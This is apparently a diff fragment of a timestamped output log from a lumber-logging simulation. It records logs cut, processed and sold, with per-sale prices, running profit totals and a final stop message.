+Wed 06/13 05:42:25 PROC  : Processing 24 logs! 
+Wed 06/13 05:43:14 LOG   : 5 logs logged!
+Wed 06/13 05:44:13 PROC  : Processing 5 logs! 
+Wed 06/13 05:44:53 LOG   : 9 logs logged!
+Wed 06/13 05:45:50 LOG   : 7 logs logged!
+Wed 06/13 05:46:37 LOG   : 8 logs logged!
+Wed 06/13 05:47:34 LOG   : 11 logs logged!
+Wed 06/13 05:48:15 LOG   : 5 logs logged!
+Wed 06/13 05:49:12 LOG   : 10 logs logged!
+Wed 06/13 05:50:00 SELL  : Sold 45 logs for $126.00 each! There are still 85 unsold logs!
+Wed 06/13 05:50:00 PROF  : Profitted $5670.00! ($198236.00 total)
+Wed 06/13 05:50:56 LOG   : 13 logs logged!
+Wed 06/13 05:51:37 LOG   : 12 logs logged!
+Wed 06/13 05:52:22 LOG   : 14 logs logged!
+Wed 06/13 05:53:20 SELL  : Sold 52 logs for $100.00 each! There are still 33 unsold logs!
+Wed 06/13 05:53:20 PROF  : Profitted $5200.00! ($203436.00 total)
+Wed 06/13 06:39:48 STOP  : ************************** STOPPING LOGGING **************************
+Wed 06/13 06:39:48 FIN   : Sold 1834 logs for a total of $203436 profit!
